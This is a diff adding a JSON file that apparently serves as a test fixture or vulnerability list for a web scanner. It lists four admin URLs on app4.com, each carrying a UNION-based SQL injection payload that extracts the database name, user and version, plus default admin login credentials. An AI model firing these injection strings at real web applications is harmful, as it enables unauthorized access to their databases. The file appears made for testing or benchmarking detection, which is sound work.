@@ -1,0 +1,36 @@
+[
+    {
+        "https://app4.com/admin/project.php?op=edit_component&id=1%0A%27+and+1=2+union+select+1,2,database%28%29,user%28%29,5,6,version%28%29,8,9,10,11,12+--+%20%3E%3E%2": [
+            {
+                "LoginRequired": "true", 
+                "method": "GET", 
+                "password": "admin", 
+                "username": "admin@admin.com"
+            }
+        ], 
+        "https://app4.com/admin/resolution.php?op=edit&resolution_id=1%0A%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29+--+": [
+            {
+                "LoginRequired": "true", 
+                "method": "GET", 
+                "password": "admin", 
+                "username": "admin@admin.com"
+            }
+        ], 
+        "https://app4.com/admin/severity.php?op=edit&severity_id=1%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+": [
+            {
+                "LoginRequired": "true", 
+                "method": "GET", 
+                "password": "admin", 
+                "username": "admin@admin.com"
+            }
+        ], 
+        "https://app4.com/admin/status.php?op=edit&use_js=1&status_id=1%0A%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+": [
+            {
+                "LoginRequired": "true", 
+                "method": "GET", 
+                "password": "admin", 
+                "username": "admin@admin.com"
+            }
+        ]
+    }
+]
